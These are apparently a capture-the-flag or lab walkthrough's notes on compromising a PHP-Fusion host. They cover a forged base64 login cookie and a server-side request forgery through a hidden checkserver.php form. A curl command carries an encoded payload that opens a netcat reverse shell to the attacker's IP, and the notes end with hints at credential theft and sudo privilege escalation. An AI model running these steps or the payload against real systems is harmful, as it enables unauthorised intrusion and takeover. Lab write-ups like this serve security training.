on main site there was cookie in base64 .. success false

so changed it and try again to login and got in

on checking source code there was

```
<p>Check if the testing server where phpfusion is installed is correctly running.</p>
    <form action="checkserver.php" method="post">
        <input id="url" name="url" type="hidden" value="http://127.0.0.1:8080">
        <input type="submit" value="Check">
    </form>
```

we saw phpfusion on searchsploit

1.  it was on localhost

2)so we can send it like

```
curl -X POST http://192.168.120.92/administration/checkserver.php -d '''url=http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=${system(base64_decode(bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTE4LjE0IDEyMzQg))}''' --cookie "auth_status=eydzdWNjZXNzJzondHJ1ZSd9"
```

getting the payload from searchsploit

3.  checking db config file to get james user
    
4.  esc .. put php file in sudo -l file
